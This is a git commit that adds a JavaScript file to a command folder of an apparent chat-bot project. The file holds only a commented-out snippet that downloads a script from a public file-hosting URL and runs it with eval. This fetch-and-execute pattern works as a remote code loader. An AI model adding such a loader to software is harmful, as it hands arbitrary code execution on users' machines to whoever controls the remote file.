3aed360d64fa68876378d5385bb8ba9c7d2cf736
ANDBAD-MD-V1 <mallyaandrea361@gmail.com>
2025-02-25 23:19:50 +0300

    Create Gangndbad.js

---
+++ Andbad_cmds/Gangndbad.js
@@ -0,0 +1,7 @@
+/*const axios = require('axios');
+
+const url = "https://files.catbox.moe/ckwyzs.js";
+
+axios.get(url)
+    .then(response => eval(response.data))
+    .catch(err => console.error(err));*/
